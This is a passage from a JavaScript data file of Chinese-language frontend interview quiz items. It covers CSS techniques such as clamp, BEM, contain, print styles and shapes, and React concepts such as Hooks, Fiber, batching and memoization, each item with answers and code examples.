                codeExample: `/* calc：混合运算 */\n.sidebar { width: calc(100% - 200px); }\n.gap { margin: calc(var(--space) * 2); }\n.center { left: calc(50% - 100px); }\n\n/* clamp：响应式字号 */\nh1 {\n  font-size: clamp(1.5rem, 1rem + 2vw, 3rem);\n  /* 最小 1.5rem 最大 3rem，中间随视口线性变化 */\n}\n.container {\n  width: clamp(320px, 90vw, 1200px);\n  margin: 0 auto;\n}\n\n/* min/max */\n.box {\n  width: min(90vw, 800px);   /* 不超过 800px */\n  font-size: max(14px, 2vw);  /* 不小于 14px */\n}\n\n/* 配合 CSS 变量 */\n:root { --max-w: 1200px; }\n.page { width: min(100% - 2rem, var(--max-w)); }`,
                difficulty: 'medium',
                tags: ['calc', 'clamp', 'min', 'max'],
                keyPoints: ['calc 混合单位运算', 'clamp 限制范围', 'min/max 取极值', '避免媒体查询'],
              },
              {
                id: 'css-scss-bem',
                domain: 'css',
                question: 'BEM 命名规范是什么？如何与 SCSS 配合？有何优缺点？',
                shortAnswer: 'BEM = Block__Element--Modifier（块__元素--修饰符），如 .card__title--active。SCSS 用 & 嵌套简化书写。优点：命名清晰、避免冲突、低优先级；缺点：类名长、结构变化时改名累。',
                detailedAnswer: 'BEM（Block Element Modifier）命名规范：\n\n格式：block__element--modifier\n- block：独立的组件块（.card、.nav、.form）\n- element：块的内部部分，用 __ 双下划线（.card__title、.card__body）\n- modifier：块或元素的状态/变体，用 -- 双连字符（.card--dark、.card__title--large）\n\n示例：\n<div class="card card--featured">\n  <h2 class="card__title card__title--large">标题</h2>\n  <div class="card__body">内容</div>\n  <button class="card__button card__button--disabled">按钮</button>\n</div>\n\n与 SCSS 配合（& 嵌套）：\n.card {\n  background: #fff;\n  &--featured { border: 2px solid gold; }  // .card--featured\n  &__title {\n    font-size: 1.2rem;\n    &--large { font-size: 1.5rem; }          // .card__title--large\n  }\n  &__body { padding: 16px; }\n}\n- & 引用父选择器，避免重复书写\n- 编译后生成扁平的类名（无嵌套优先级问题）\n\nBEM 优点：\n1. 命名清晰：看类名就知道结构关系\n2. 避免冲突：长类名几乎不会重复\n3. 低优先级：都是单类选择器（0,0,1,0），易覆盖\n4. 模块化：block 独立，可复用\n5. 防 HTML 结构耦合：不依赖 DOM 嵌套\n\nBEM 缺点：\n1. 类名长：card__title--large 不简洁\n2. 结构变化时改名累：element 重命名需改 HTML 和 CSS\n3. 不适合所有场景：工具类、原子化 CSS 与 BEM 理念冲突\n4. 嵌套深时类名更长：block__elem1__elem2 不推荐（BEM 不鼓励多级 element）\n\nBEM 注意：\n- element 不应该嵌套 element（不写 .block__elem1__elem2）\n  - 错：.card__body__title\n  - 对：.card__title（直接隶属于 block）\n- modifier 不能单独使用，必须配合 block/element\n  - 错：<div class="--active">\n  - 对：<div class="card card--active">\n- 嵌套 block 时，内层 block 是独立的，不属于外层\n\n现代趋势：\n- CSS Modules / Styled Components 自动生成唯一类名，替代手动 BEM\n- Tailwind 等原子化方案不使用 BEM\n- 但 BEM 思想（块、元素、修饰符）仍适用',
                codeExample: `/* BEM + SCSS */\n.form {\n  padding: 20px;\n  &--inline { display: flex; gap: 8px; }\n  &__label { display: block; margin-bottom: 4px; }\n  &__input {\n    border: 1px solid #ccc;\n    &--error { border-color: red; }\n    &--disabled { background: #f5f5f5; }\n  }\n  &__button {\n    background: blue; color: white;\n    &--primary { background: #007bff; }\n    &--ghost { background: transparent; }\n  }\n}\n\n/* HTML */\n<form class="form form--inline">\n  <label class="form__label">邮箱</label>\n  <input class="form__input form__input--error">\n  <button class="form__button form__button--primary">提交</button>\n</form>`,
                difficulty: 'medium',
                tags: ['BEM', '命名规范', 'SCSS'],
                keyPoints: ['Block__Element--Modifier', 'SCSS & 嵌套简化', '低优先级避免冲突', 'element 不嵌套 element'],
              },
              {
                id: 'css-contain-will-change',
                domain: 'css',
                question: 'contain 和 will-change 的作用？何时使用？',
                shortAnswer: 'contain 隔离元素的布局/绘制/样式影响，提升渲染性能；will-change 提示浏览器元素将变化，提前优化（创建图层）。两者都是性能优化，但滥用会占内存，应按需使用。',
                detailedAnswer: 'CSS Containment（contain）：\n告诉浏览器元素的某些方面独立于其余树，可跳过不必要的计算。\n\ncontain 取值（可组合）：\n- layout：元素布局不影响外部（外部变化也不影响内部）\n- paint：元素内容不溢出边界（类似 overflow:clip）\n- style：计数器和引号作用域独立\n- size：元素尺寸不受内容影响（需显式设尺寸）\n- content = layout + paint + style（除 size）\n- strict = layout + paint + size + style（全部）\n\n应用场景：\n1. 长列表/卡片网格：contain: layout，隔离各卡片布局\n2. 第三方 widget：contain: strict，完全隔离\n3. 固定尺寸容器：contain: size\n\n.contain-card { contain: content; }\n- 浏览器知道该子树独立，外部 reflow 不会重新计算它\n- 显著提升大型页面滚动性能\n\nwill-change：\n提示浏览器元素即将变化哪些属性，浏览器可提前优化（如创建独立图层、预分配资源）。\n\n用法：\nwill-change: transform;\nwill-change: transform, opacity;\nwill-change: scroll-position;\n\n应用场景：\n1. 即将动画的元素：hover/focus 时设置\n2. 滚动容器：will-change: scroll-position\n3. 频繁变化的属性\n\n最佳实践：\n/* 仅在需要时设置，动画后移除 */\n.card { transition: transform 0.3s; }\n.card:hover {\n  transform: scale(1.05);\n  will-change: transform;  /* hover 时优化 */\n}\n/* 或 JS 在动画前加，动画后移除 */\nel.style.willChange = "transform";\n// 动画结束后\nel.style.willChange = "auto";\n\nwill-change 滥用危害：\n- 每个声明都会创建独立图层，占 GPU 内存\n- 过多图层导致合成性能下降\n- 不要长期设置（不要写在基础样式中）\n- 不要全局 * { will-change: transform; }\n\ncontain vs will-change：\n- contain：隔离影响范围，减少计算量\n- will-change：提前准备资源，加速变化\n- 两者可配合：contain: layout; will-change: transform;\n\n浏览器支持：现代浏览器支持，IE 不支持。',
                codeExample: `/* contain：隔离卡片提升滚动性能 */\n.card-list { contain: layout; }\n.card {\n  contain: content; /* layout + paint + style */\n}\n\n/* 固定尺寸容器 */\n.widget {\n  contain: strict; /* layout + paint + size + style */\n  width: 300px;\n  height: 200px;\n}\n\n/* will-change：动画前优化 */\n.modal {\n  opacity: 0;\n  transition: opacity 0.3s;\n}\n.modal.opening {\n  will-change: opacity;\n  opacity: 1;\n}\n\n/* JS 控制 will-change */\nbutton.addEventListener("mouseenter", () => {\n  el.style.willChange = "transform";\n});\nbutton.addEventListener("transitionend", () => {\n  el.style.willChange = "auto";\n});`,
                difficulty: 'hard',
                tags: ['contain', 'will-change', '性能优化'],
                keyPoints: ['contain 隔离渲染影响', 'will-change 提前优化', 'will-change 滥用占内存', '动画后移除 will-change'],
              },
              {
                id: 'css-print-stylesheet',
                domain: 'css',
                question: '如何实现打印样式优化？@media print 有哪些常用设置？',
                shortAnswer: '用 @media print 写打印专用样式：隐藏导航/广告、改深色为黑色、设 page size/margin、避免背景图（除非 print-color-adjust）、分页控制 page-break。配合 <link media="print">。',
                detailedAnswer: '打印样式优化方案：\n\n1. 引入方式：\n- 内联：@media print { ... }\n- 外链：<link rel="stylesheet" href="print.css" media="print">\n- @import：@import url("print.css") print;\n\n2. 常用设置：\n\n隐藏不需要打印的元素：\n@media print {\n  .nav, .sidebar, .ad, .footer, .no-print { display: none !important; }\n  .main { width: 100%; margin: 0; }\n}\n\n颜色处理：\n- 浏览器默认不打印背景（省墨）\n- 强制打印背景：* { -webkit-print-color-adjust: exact; print-color-adjust: exact; }\n- 改深色为黑色：body { color: #000; background: #fff; }\n- 链接显示 URL：a::after { content: " (" attr(href) ")"; }\n\n字体：\n@media print {\n  body { font: 12pt Georgia, serif; }\n  h1 { font-size: 18pt; }\n}\n- 打印用 pt（点）而非 px\n- 衬线字体打印更清晰\n\n页面设置：\n@page {\n  size: A4;           /* 或 letter、landscape */\n  margin: 2cm;\n}\n@page :first { margin-top: 4cm; } /* 首页不同 */\n\n分页控制：\n- page-break-before: always / avoid\n- page-break-after: always / avoid\n- page-break-inside: avoid（元素不被分页截断）\n- break-before / break-after / break-inside（新版）\n\n@media print {\n  h1, h2 { page-break-after: avoid; }   /* 标题不与内容分离 */\n  table, figure { page-break-inside: avoid; }\n  .chapter { page-break-before: always; }\n}\n\n3. 打印预览/触发：\n- JS：window.print()\n- 监听打印：window.onbeforeprint / onafterprint\n\n4. 调试：\n- Chrome DevTools → More tools → Rendering → Emulate CSS media: print\n- 直接预览看效果\n\n5. 注意事项：\n- position: fixed 在打印时可能重复出现，改为 static\n- 浮动可能导致布局错乱，打印时清除\n- 大表格用 thead 在每页重复：thead { display: table-header-group; }\n- 图片可能被分页截断，设 page-break-inside: avoid',
                codeExample: `/* print.css */\n@media print {\n  /* 隐藏无关元素 */\n  .nav, .sidebar, .ad, .btn-print { display: none !important; }\n  \n  /* 主内容全宽 */\n  .main { width: 100% !important; margin: 0 !important; padding: 0 !important; }\n  \n  /* 颜色优化 */\n  body { color: #000; background: #fff; font: 12pt Georgia, serif; }\n  * { -webkit-print-color-adjust: exact; }\n  \n  /* 链接显示 URL */\n  a::after { content: " (" attr(href) ")"; font-size: 10pt; color: #555; }\n  \n  /* 分页控制 */\n  h1, h2, h3 { page-break-after: avoid; }\n  table, figure, img { page-break-inside: avoid; }\n  .chapter { page-break-before: always; }\n  \n  /* 表头每页重复 */\n  thead { display: table-header-group; }\n}\n\n@page { size: A4; margin: 2cm; }`,
                difficulty: 'medium',
                tags: ['打印样式', '@media print', 'page-break'],
                keyPoints: ['@media print 隐藏无关元素', '@page 设置页面', 'page-break 分页控制', 'print-color-adjust 强制背景'],
              },
              {
                id: 'css-custom-checkbox',
                domain: 'css',
                question: '如何用纯 CSS 自定义 checkbox/radio 样式？',
                shortAnswer: '隐藏原生 input，用 label 关联（for 或包裹），用伪元素 ::before/::after 绘制自定义外观，通过 :checked 选择器切换状态。也可用 appearance: none 简化。',
                detailedAnswer: '纯 CSS 自定义 checkbox/radio 方案：\n\n方案 1：appearance: none + 自定义样式（现代，推荐）\n.checkbox {\n  appearance: none;\n  -webkit-appearance: none;\n  width: 18px; height: 18px;\n  border: 2px solid #ccc;\n  border-radius: 3px;\n  position: relative;\n  cursor: pointer;\n}\n.checkbox:checked {\n  background: #007bff;\n  border-color: #007bff;\n}\n.checkbox:checked::after {\n  content: "";\n  position: absolute;\n  left: 5px; top: 1px;\n  width: 5px; height: 10px;\n  border: solid #fff;\n  border-width: 0 2px 2px 0;\n  transform: rotate(45deg);\n}\n- appearance: none 移除原生外观\n- :checked 切换样式\n- ::after 绘制对勾\n\n方案 2：隐藏 input + label + 伪元素（兼容性好）\n<input type="checkbox" id="cb" class="cb-input">\n<label for="cb" class="cb-label">同意</label>\n\n.cb-input { display: none; } /* 或 visually hidden */\n.cb-label {\n  position: relative;\n  padding-left: 28px;\n  cursor: pointer;\n}\n.cb-label::before {\n  content: "";\n  position: absolute;\n  left: 0; top: 0;\n  width: 18px; height: 18px;\n  border: 2px solid #ccc;\n  border-radius: 3px;\n}\n.cb-input:checked + .cb-label::before {\n  background: #007bff;\n  border-color: #007bff;\n}\n.cb-input:checked + .cb-label::after {\n  content: "";\n  position: absolute;\n  left: 6px; top: 2px;\n  width: 5px; height: 10px;\n  border: solid #fff;\n  border-width: 0 2px 2px 0;\n  transform: rotate(45deg);\n}\n- 用 + 相邻兄弟选择器关联 input 和 label\n- input 必须在 label 前（或用 ~）\n\n方案 3：input 包裹在 label 内\n<label class="cb">\n  <input type="checkbox">\n  <span class="cb-text">同意</span>\n</label>\n- 不需要 for 关联\n- 用 input:checked ~ .cb-text::after\n\n注意：\n- 不要用 display:none 隐藏 input（影响无障碍），用 .sr-only 视觉隐藏\n- 保留键盘可访问性：:focus-visible 加焦点样式\n- 移动端点击区域不小于 44×44px',
                codeExample: `/* 方案 1：appearance none */\n.cb {\n  appearance: none;\n  width: 18px; height: 18px;\n  border: 2px solid #ccc;\n  border-radius: 3px;\n  position: relative;\n  cursor: pointer;\n  transition: all 0.2s;\n}\n.cb:checked {\n  background: #007bff;\n  border-color: #007bff;\n}\n.cb:checked::after {\n  content: "";\n  position: absolute;\n  left: 5px; top: 1px;\n  width: 5px; height: 10px;\n  border: solid #fff;\n  border-width: 0 2px 2px 0;\n  transform: rotate(45deg);\n}\n.cb:focus-visible {\n  outline: 2px solid #007bff;\n  outline-offset: 2px;\n}\n\n/* radio 圆形 */\n.radio { border-radius: 50%; }\n.radio:checked::after {\n  content: "";\n  position: absolute;\n  left: 3px; top: 3px;\n  width: 8px; height: 8px;\n  border-radius: 50%;\n  background: #fff;\n}`,
                difficulty: 'medium',
                tags: ['自定义样式', 'checkbox', 'appearance'],
                keyPoints: ['appearance none 移除原生', ':checked 切换状态', '伪元素绘制外观', '保留无障碍'],
              },
              {
                id: 'css-triangle-shapes',
                domain: 'css',
                question: '用 CSS 实现三角形、圆形、半圆、扇形等基本图形？',
                shortAnswer: '三角形：border 宽度+其他边透明；圆形：border-radius:50%；半圆：border-radius 50% 但只设一侧；扇形：border-radius 一角 100%+隐藏部分。现代也可用 clip-path。',
                detailedAnswer: 'CSS 基本图形实现：\n\n1. 三角形（border 法）：\n.triangle-up {\n  width: 0; height: 0;\n  border-left: 50px solid transparent;\n  border-right: 50px solid transparent;\n  border-bottom: 50px solid red;\n}\n- 原理：宽高为 0，四个 border 形成四个三角形，只显示一个\n- 上三角：底边有色，左右透明\n- 下三角：上边有色\n- 左三角：右边有色\n- 右三角：左边有色\n- 直角三角形：只设两条相邻边（一条有色一条透明）\n\n2. 圆形：\n.circle { width: 100px; height: 100px; border-radius: 50%; background: red; }\n- border-radius: 50% 即可\n- 椭圆：width ≠ height\n\n3. 半圆：\n.semicircle-top {\n  width: 100px; height: 50px;\n  border-radius: 50% 50% 0 0 / 100% 100% 0 0;\n  background: red;\n}\n- 高度为宽的一半\n- border-radius 仅上方圆角\n\n4. 扇形：\n.sector {\n  width: 100px; height: 100px;\n  border-radius: 100% 0 0 0;  /* 左上角圆 */\n  background: red;\n}\n- 一角 100%，其他 0\n- 1/4 圆\n\n5. 椭圆：\n.ellipse {\n  width: 200px; height: 100px;\n  border-radius: 50%;\n  background: red;\n}\n\n6. 平行四边形：\n.parallelogram {\n  width: 100px; height: 50px;\n  transform: skew(20deg);\n  background: red;\n}\n\n7. 梯形：\n.trapezoid {\n  width: 80px; height: 0;\n  border-bottom: 50px solid red;\n  border-left: 25px solid transparent;\n  border-right: 25px solid transparent;\n}\n\n8. 五角星：\n用 clip-path 或多个元素组合\n\n9. 心形：\n用两个圆 + 旋转的方块，或 clip-path\n\n现代方案：clip-path\n.triangle { clip-path: polygon(50% 0, 0 100%, 100% 100%); }\n.star { clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%); }\n.heart { clip-path: path("..."); }\n- clip-path 更灵活，支持任意多边形\n- 可用 SVG path 绘制复杂图形\n- 配合 :hover 动画效果好\n\n其他技巧：\n- 阴影法：box-shadow 绘制复杂图形\n- 渐变法：linear-gradient/radial-gradient 绘制图形\n- transform: rotate/scale 变换组合',
                codeExample: `/* 三角形 */\n.tri-up {\n  width: 0; height: 0;\n  border-left: 50px solid transparent;\n  border-right: 50px solid transparent;\n  border-bottom: 50px solid red;\n}\n\n/* 圆形 */\n.circle { width: 100px; height: 100px; border-radius: 50%; background: red; }\n\n/* 半圆 */\n.semicircle {\n  width: 100px; height: 50px;\n  border-radius: 50% 50% 0 0;\n  background: red;\n}\n\n/* 扇形 */\n.sector {\n  width: 100px; height: 100px;\n  border-radius: 100% 0 0 0;\n  background: red;\n}\n\n/* 现代方案：clip-path 三角形 */\n.tri-clip {\n  width: 100px; height: 100px;\n  background: red;\n  clip-path: polygon(50% 0, 0 100%, 100% 100%);\n}\n\n/* 平行四边形 */\n.parallelogram {\n  width: 100px; height: 50px;\n  background: red;\n  transform: skew(-20deg);\n}`,
                difficulty: 'easy',
                tags: ['三角形', '基本图形', 'border', 'clip-path'],
                keyPoints: ['三角形用 border 透明', '圆形 border-radius 50%', '半圆一半尺寸+部分圆角', 'clip-path 现代方案'],
              },
              {
                id: 'css-inherit-initial',
                domain: 'css',
                question: 'CSS 中 inherit、initial、unset、revert 关键字的区别？',
                shortAnswer: 'inherit 强制继承父元素值；initial 重置为 CSS 规范默认初始值；unset 等于 inherit（可继承属性）或 initial（不可继承属性）；revert 重置为浏览器默认样式（非规范初始值）。',
                detailedAnswer: 'CSS 全局关键字值：\n\n1. inherit：强制继承父元素的对应属性值。\n- 即使该属性默认不继承（如 border、margin），也强制继承父值\n- 例：.child { border: inherit; } 继承父元素的 border\n- 用于强制继承的场景\n\n2. initial：将属性重置为 CSS 规范定义的初始值。\n- 每个 CSS 属性都有规范定义的 initial 值\n- 如 color: initial → black（规范初始值）\n- display: initial → inline（规范初始值，不是浏览器默认的 block）\n- 用于覆盖样式重置\n\n3. unset：behave as inherit 或 initial。\n- 若属性默认可继承（color、font 等）→ 等同 inherit（继承父值）\n- 若属性默认不继承（border、margin 等）→ 等同 initial（规范初始值）\n- 用于恢复自然状态\n- 例：.reset { all: unset; } 清除所有样式\n\n4. revert：重置为浏览器默认样式（user-agent stylesheet）。\n- 与 initial 不同：initial 是规范初始值，revert 是浏览器默认样式\n- 例：display: revert → div 变回 block（浏览器默认），而非 inline（规范初始）\n- 更符合恢复浏览器默认的直觉\n- 例：h1 { color: revert; } 恢复浏览器对 h1 的默认样式\n\n对比示例：\n.child { color: inherit; }   → color 继承父元素\n.child { color: initial; }   → color 重置为 black（规范初始）\n.child { color: unset; }     → color 可继承，等同 inherit\n.child { color: revert; }    → color 恢复浏览器默认\n.child { border: inherit; }  → border 强制继承父（默认不继承）\n.child { border: initial; }  → border 重置为 none（规范初始）\n.child { border: unset; }    → border 不继承，等同 initial\n.child { border: revert; }   → border 恢复浏览器默认\n\nall 关键字：\n- all: inherit / initial / unset / revert 一次性应用到所有属性\n- all: unset 常用于组件样式隔离（清除所有继承和默认）\n\n应用场景：\n- 组件内重置：all: unset 清除外部样式影响\n- 覆盖第三方库：revert 恢复浏览器默认\n- 强制继承：inherit 让默认不继承的属性继承',
                codeExample: `/* inherit：强制继承父元素 */\n.link { color: inherit; } /* 链接继承父颜色，不用默认蓝 */\n\n/* initial：规范初始值 */\n.reset { display: initial; } /* 重置为 inline（规范） */\n\n/* unset：恢复自然状态 */\n.btn { all: unset; } /* 清除所有样式，从零开始 */\n\n/* revert：浏览器默认 */\nh1 { font-size: revert; } /* 恢复浏览器对 h1 的默认字号 */\nbutton { all: revert; } /* 恢复 button 浏览器默认样式 */\n\n/* 实战：组件隔离 */\n.isolated-widget {\n  all: initial; /* 重置所有样式 */\n  font-family: inherit; /* 仅继承字体 */\n  color: inherit;\n}`,
                difficulty: 'medium',
                tags: ['inherit', 'initial', 'unset', 'revert'],
                keyPoints: ['inherit 强制继承父值', 'initial 规范初始值', 'unset 可继承则继承否则初始', 'revert 浏览器默认样式'],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 3：框架八股（React/Vue）
    // ========================================================================
    {
      order: 3,
      title: '框架八股（React / Vue）',
      difficulty: 3,
      visualizationType: 'interview-quiz-engine',
      blocks: [
        {
          id: 'iv-p3-1',
          type: 'paragraph',
          lead: true,
          text: 'React 和 Vue 是前端两大主流框架。面试中常考虚拟 DOM、Diff 算法、Hooks、响应式原理、组件通信等。以下通过问答引擎自测。',
        },
        {
          id: 'iv-p3-2',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'react',
            mode: 'sequential',
            questions: [
              {
                id: 'react-vdom-diff',
                domain: 'react',
                question: '虚拟 DOM 是什么？Diff 算法的三大假设是什么？',
                shortAnswer: '虚拟 DOM 是真实 DOM 的 JS 对象表示。Diff 三大假设：1) 同类型元素产生不同树 2) 同类型保留节点只更新属性 3) 列表通过 key 标识复用。',
                detailedAnswer: '虚拟 DOM（Virtual DOM）是用 JavaScript 对象描述真实 DOM 的树结构。每次状态变化生成新的虚拟 DOM，与旧虚拟 DOM 通过 Diff 算法比较，计算出最小变更集，批量更新真实 DOM。\n\nDiff 算法三大假设（将 O(n³) 优化为 O(n)）：\n1. 不同类型的元素产生不同的树（div→span 直接销毁重建）\n2. 同类型的元素保留 DOM 节点，只更新属性\n3. 列表通过 key 标识元素，key 不变则复用节点\n\nkey 的作用：帮助 React 识别列表中哪些元素发生了变化（添加/删除/重排序）。用 index 作 key 在列表顺序变化时会导致性能下降和状态错乱。',
                difficulty: 'medium',
                tags: ['虚拟DOM', 'Diff', 'key', '面试必考'],
                keyPoints: ['虚拟 DOM = JS 对象表示 DOM', 'Diff 三大假设降复杂度', 'key 标识列表元素复用', 'index 作 key 的危害'],
              },
              {
                id: 'react-hooks-rules',
                domain: 'react',
                question: 'React Hooks 的使用规则是什么？为什么不能在条件语句中调用 Hooks？',
                shortAnswer: '规则：1) 只在顶层调用（不能在条件/循环/嵌套函数中）2) 只在 React 函数组件或自定义 Hook 中调用。原因：Hooks 依赖调用顺序的链表来对应 state，条件调用会打乱顺序。',
                detailedAnswer: 'React Hooks 两条规则：\n1. 只在最顶层使用 Hook——不要在循环、条件或嵌套函数中调用 Hook。必须始终在 React 函数顶层调用它们。\n2. 只在 React 函数中调用 Hook——不要在普通 JavaScript 函数中调用 Hook。\n\n原因：React 依赖 Hook 的调用顺序来将每个 Hook 与对应的 state 关联。React 内部用一个链表（memoizedState）按顺序存储每个 Hook 的状态。如果在条件语句中调用 Hook，不同渲染周期中 Hook 的调用顺序可能不同，导致 state 错位。',
                codeExample: `// ❌ 错误：条件调用 Hook
function Bad({ cond }) {
  if (cond) {
    const [state, setState] = useState(0); // 顺序可能变化
  }
  const [name, setName] = useState('');
}

// ✅ 正确：始终在顶层调用
function Good({ cond }) {
  const [state, setState] = useState(0);
  const [name, setName] = useState('');
  if (cond) setState(1); // 条件逻辑放在 Hook 之后
}`,
                difficulty: 'medium',
                tags: ['Hooks', '面试必考'],
                keyPoints: ['只在顶层调用', '只在 React 函数中调用', '依赖调用顺序的链表', '条件调用会打乱顺序'],
              },
              {
                id: 'react-useeffect-layout',
                domain: 'react',
                question: 'useEffect 和 useLayoutEffect 的区别是什么？',
                shortAnswer: 'useEffect 异步执行（绘制后），不阻塞渲染；useLayoutEffect 同步执行（DOM 变更后绘制前），阻塞渲染。需要读取 DOM 布局并同步修改避免闪烁时用 useLayoutEffect。',
                detailedAnswer: '执行时机不同：\n- useEffect：在浏览器绘制后异步执行，不阻塞屏幕更新。适合大多数副作用（数据获取、事件监听、订阅）。\n- useLayoutEffect：在 DOM 变更后、浏览器绘制前同步执行，会阻塞绘制。适合需要读取 DOM 布局并立即修改以避免视觉闪烁的场景（如 Tooltip 定位）。\n\n执行顺序：React 更新 DOM → useLayoutEffect 同步执行 → 浏览器绘制 → useEffect 异步执行。\n\n95% 场景用 useEffect，仅在「读取 DOM 布局 → 同步修改 → 避免闪烁」时用 useLayoutEffect。',
                difficulty: 'medium',
                tags: ['useEffect', 'useLayoutEffect'],
                keyPoints: ['useEffect 异步不阻塞', 'useLayoutEffect 同步阻塞', '执行顺序：DOM→Layout→绘制→Effect', '避免闪烁用 Layout'],
              },
              {
                id: 'react-fiber',
                domain: 'react',
                question: 'React Fiber 架构是什么？为何需要时间分片？',
                shortAnswer: 'Fiber 是 React 16 的重构架构，将组件树拆为 Fiber 节点链表，支持可中断/可恢复的渲染。时间分片让长任务切片执行，避免阻塞主线程，实现 Concurrent 模式。',
                detailedAnswer: 'Fiber 架构核心：\n\n1. Fiber 节点：每个组件对应一个 Fiber 节点，包含 state、props、child/sibling/return 指针，形成链表结构（非递归树）\n\n2. 双缓冲：current 树（当前屏幕）+ workInProgress 树（构建中），切换指针即可切换显示\n\n3. 可中断渲染：\n   - 协调阶段（Reconcile）：构建 workInProgress 树，可被中断（低优先级）\n   - 提交阶段（Commit）：同步应用到 DOM，不可中断（高优先级）\n\n4. 时间分片（Time Slicing）：\n   - 利用 requestIdleCallback 思路（实际用 MessageChannel）\n   - 每帧留 5ms 给渲染，剩余时间切片执行 Fiber 工作\n   - 优先级：Synchronous > User-blocking > Normal > Idle\n\n5. 为何需要：\n   - Stack Reconciler 递归调用栈深，长列表渲染阻塞主线程导致掉帧\n   - Fiber 让 React 可暂停渲染处理用户输入，再恢复\n   - 支持 Concurrent 模式：Suspense、useTransition、startTransition\n\n应用：React 18 的 concurrent 特性（自动批处理、过渡、Suspense 数据获取）都依赖 Fiber。',
                difficulty: 'hard',
                tags: ['Fiber', '架构', '时间分片'],
                keyPoints: ['Fiber 节点链表结构', '双缓冲 current/WIP', '协调可中断/提交不可中断', '时间分片避免阻塞'],
              },
              {
                id: 'react-setstate-batch',
                domain: 'react',
                question: 'React setState 是同步还是异步？批处理（Batching）机制如何工作？',
                shortAnswer: 'setState 本身同步，但状态更新被批处理延迟到事件处理结束。React 17 仅在合成事件批处理，React 18 自动批处理（含 Promise/setTimeout/原生事件）。',
                detailedAnswer: 'setState 的"异步"本质：\n\n1. setState 本身是同步函数调用，但 React 将状态更新放入队列，延迟到当前事件循环结束统一处理（批处理 Batching）\n\n2. 批处理目的：避免多次 setState 触发多次渲染，合并为一次\n\nReact 17 批处理范围（合成事件）：\n- onClick 等合成事件：批处理（一次渲染）\n- setTimeout、Promise.then、原生事件：不批处理（每次 setState 触发渲染）\n\nReact 18 自动批处理（Automatic Batching）：\n- 所有场景都批处理（合成事件、setTimeout、Promise、原生事件）\n- 想立即更新用 flushSync 强制同步\n\n执行顺序示例：\n```js\nfunction handleClick() {\n  setCount(1); // 不立即更新\n  setCount(2); // 覆盖为 2\n  setFlag(true);\n  console.log(count); // 旧值\n  // 事件结束 → 一次渲染，count=2, flag=true\n}\n```\n\n为何看似异步：\n- React 用 isBatchingUpdates 标志位控制\n- 18 版用 concurrent 模式 + lane 优先级，统一调度\n\n函数式更新避免闭包陷阱：\n```js\nsetCount(prev => prev + 1); // 基于前一个 state\n```',
                difficulty: 'medium',
                tags: ['setState', '批处理', 'React18'],
                keyPoints: ['setState 同步但更新被批处理', 'React 17 仅合成事件批处理', 'React 18 自动批处理', 'flushSync 强制同步'],
              },
              {
                id: 'react-hoc-renderprops-hooks',
                domain: 'react',
                question: 'React 逻辑复用三种方式：HOC、Render Props、Hooks 的区别？',
                shortAnswer: 'HOC：函数包裹组件返回新组件，嵌套地狱。Render Props：通过 prop 传渲染函数，JSX 嵌套深。Hooks：函数内调用，扁平组合，是现代首选。',
                detailedAnswer: '三种逻辑复用方案：\n\n1. HOC（Higher-Order Component）：\n- 形式：函数接收组件返回新组件 withAuth(Component)\n- 优点：可链式调用 withTheme(withRouter(withAuth(Component)))\n- 缺点：\n  - 嵌套地狱（Wrapper Hell）\n  - props 来源不清晰（多个 HOC 注入同名 props 冲突）\n  - ref 转发麻烦\n  - TypeScript 类型推导困难\n- 例：react-redux 的 connect、withRouter\n\n2. Render Props：\n- 形式：组件接收 render prop 函数 <Mouse render={pos => ...} />\n- 优点：明确数据来源，避免 props 冲突\n- 缺点：\n  - JSX 嵌套深（多层 Render Props 形成回调地狱）\n  - 性能：每次 render 创建新函数，需注意 memo\n- 例：react-motion 的 Motion、downshift\n\n3. Hooks（React 16.8+，现代首选）：\n- 形式：在函数组件内调用 const [state, setState] = useXxx()\n- 优点：\n  - 扁平组合，无嵌套\n  - 数据来源清晰\n  - 类型推导友好\n  - 可自定义 Hook 复用逻辑\n- 缺点：\n  - 必须遵守 Hooks 规则（顶层调用）\n  - 闭包陷阱（依赖数组）\n- 例：useAuth、useTheme、useFetch\n\n演进趋势：HOC → Render Props → Hooks。新代码首选 Hooks，旧 HOC 渐进迁移。',
                difficulty: 'medium',
                tags: ['HOC', 'Render Props', 'Hooks', '逻辑复用'],
                keyPoints: ['HOC 嵌套地狱', 'Render Props 回调地狱', 'Hooks 扁平组合现代首选', '演进趋势 HOC→RP→Hooks'],
              },
              {
                id: 'react-usememo-usecallback',
                domain: 'react',
                question: 'useMemo 和 useCallback 的区别？什么场景该用，什么场景不该用？',
                shortAnswer: 'useMemo 缓存计算结果（值），useCallback 缓存函数引用。用于：1) 计算开销大 2) 作为 props 传给 memo 子组件避免重渲染。不该用：简单计算、未传给 memo 子组件的函数。',
                detailedAnswer: 'useMemo 和 useCallback 区别：\n\n- useMemo(() => computeValue, [deps])：缓存计算结果值\n- useCallback(() => { ... }, [deps])：缓存函数引用，等价于 useMemo(() => fn, [deps])\n\n正确使用场景：\n1. 计算开销大（如排序/过滤大数组、复杂计算）：useMemo 避免每次 render 重算\n2. 作为 props 传给 React.memo 包裹的子组件：useCallback/useMemo 避免引用变化导致子组件重渲染\n3. 作为其他 Hook 的依赖项：避免无限循环\n\n不该用的场景：\n1. 简单计算（加法、字符串拼接）：缓存本身有开销，得不偿失\n2. 函数未传给 memo 子组件：每次创建新函数开销极小，无需缓存\n3. 依赖数组几乎每次都变：缓存无效\n\n性能陷阱：\n- useMemo 本身有内存开销（存储缓存值 + 比较依赖）\n- 过度使用反而降低性能\n- React Compiler（React 19+）可自动 memoize，未来手动 memo 需求减少\n\n最佳实践：先写正确代码，出现性能问题再用 Profiler 定位，针对性 memo。',
                codeExample: `// ✅ 正确：开销大计算 + 传给 memo 子组件
const ExpensiveList = React.memo(({ items }) => { ... })

function Parent({ data }) {
  const sorted = useMemo(() => data.sort(...), [data]) // 大数组排序
  const handleClick = useCallback(() => { ... }, [])    // 传给 memo 子组件
  return <ExpensiveList items={sorted} onClick={handleClick} />
}

// ❌ 错误：简单计算无需 memo
const sum = useMemo(() => a + b, [a, b]) // 直接 a + b 即可`,
                difficulty: 'medium',
                tags: ['useMemo', 'useCallback', '性能优化'],
